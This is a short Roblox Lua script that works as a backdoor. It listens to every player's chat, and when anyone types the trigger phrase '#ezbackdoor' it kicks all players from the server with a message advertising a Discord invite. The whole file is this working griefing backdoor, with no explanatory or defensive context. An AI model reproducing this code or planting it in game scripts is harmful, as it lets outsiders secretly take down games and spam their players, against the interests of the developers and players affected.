game.Players.PlayerAdded:Connect(function(player)
	player.Chatted:Connect(function(message)
		if message == "#ezbackdoor" then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				v:Kick("discord.gg/Ssqp5459YK")
			end
		end
	end)
end)
